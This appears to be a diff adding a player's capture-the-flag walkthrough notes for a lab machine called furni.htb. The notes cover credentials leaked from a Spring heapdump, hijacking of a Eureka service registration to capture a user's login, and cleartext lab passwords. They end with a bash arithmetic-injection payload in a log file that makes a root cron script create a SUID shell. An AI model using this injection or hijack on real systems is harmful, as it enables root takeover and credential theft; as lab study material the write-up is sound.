@@ -1,0 +1,61 @@
+* Template Name: Furni
+* Template Author: Untree.co
+* Template URI: https://untree.co/
+
+spring backend
+
+/actuator leaks a lot of stuff
+/actuator/heapdump contains this string:
+
+password=0sc@r190_S0l!dP@sswd
+user=oscar190
+
+works on ssh
+other user: miranda-wise
+
+process running:
+
+
+2025/05/15 12:32:04 CMD: UID=0     PID=87834  | /bin/bash /opt/log_analyse.sh /var/www/web/cloud-gateway/log/application.log 
+2025/05/15 12:32:02 CMD: UID=0     PID=85793  | /bin/bash /opt/log_analyse.sh /var/www/web/user-management-service/log/application.log
+2025/05/15 12:32:11 CMD: UID=0     PID=87835  | /usr/bin/find /var/www/web/cloud-gateway/log/ -type f -mmin +10 ! -name *.gz -delete 
+2025/05/13 12:25:01 CMD: UID=0     PID=2903697 | /usr/sbin/CRON -f 
+2025/05/13 12:25:01 CMD: UID=0     PID=2903707 | /bin/bash /opt/scripts/miranda-Login-Simulator.sh 
+2025/05/13 12:25:01 CMD: UID=0     PID=2903711 | curl http://furni.htb/login   -H Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8 -H Accept-Language: en-US,en;q=0.8 -H Cache-Control: max-age=0 -H Connection: keep-alive -H Content-Type: application/x-www-form-urlencoded -H Cookie: SESSION=Mjk2Yzc0ZjctZGZkZS00OTc3LTk5MmItMzY4MmQxNzhjN2Q2 -H User-Agent: Mozilla/5.0 (X11; Linux x86_64) --data @/tmp/tmp.8D1548BB8x --insecure -i
+
+
+other logs:
+
+cloud-gateway/src/main/resources/application.yaml: 2025-03-18T14:57:48.998Z  INFO 20421 --- [app-gateway] [nfoReplicator-0] c.n.d.s.t.d.RedirectingEurekaHttpClient  : Request execution error. endpoint=DefaultEndpoint{ serviceUrl='http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/}
+
+cloud-gateway/target/surefire-reports/TEST: http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/
+
+cloud-gateway/target/surefire-reports/TEST-com.eureka.gateway.ApiGatewayApplicationTests.xml: 2025-03-18T14:57:48.998Z  INFO 20421 --- [app-gateway] [nfoReplicator-0] c.n.d.s.t.d.RedirectingEurekaHttpClient  : Request execution error. endpoint=DefaultEndpoint{ serviceUrl='http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/}, exception=I/O error on POST request for "http://localhost:8761/eureka/apps/APP-GATEWAY": Connect to http://localhost:8761 [localhost/127.0.0.1] failed: Connection refused stacktrace=org.springframework.web.client.ResourceAccessException: I/O error on POST request for "http://localhost:8761/eureka/apps/APP-GATEWAY": Connect to http://localhost:8761 [localhost/127.0.0.1] failed: Connection refused
+
+there is another login on a service on port 8761 with login:
+EurekaSrvr:0scarPWDisTheB3st
+
+
+
+
+NO eureka CVE found but some rest API to register a new service. Maybe the CRON trying to login MIRANDA will contact the new service.
+
+how to register:
+https://medined.github.io/eureka/rest/python/using-eureka-rest-api-for-python-service/
+
+
+register a service under the name of USER-MANAGEMENT-SERVICE so that the curl that tries to login Miranda is redirected to your service and you can read the creds
+
+username=miranda.wise@furni.htb&password=IL!veT0Be&BeT0L0ve
+
+
+so miranda belogs to developers group, so she can modify the application.log given in input to the log_analyse.
+i tried different ways of command injection until i found this:
+
+https://github.com/v4resk/red-book/blob/main/redteam/privilege-escalation/linux/script-exploits/bash.md
+
+when there -eq is used there is a chance of command execution
+
+delete the file application.log and write in it:
+
+HTTP Status: a[$(cp /bin/bash /tmp/escalate; chmod u+s /tmp/escalate >&2)]+42
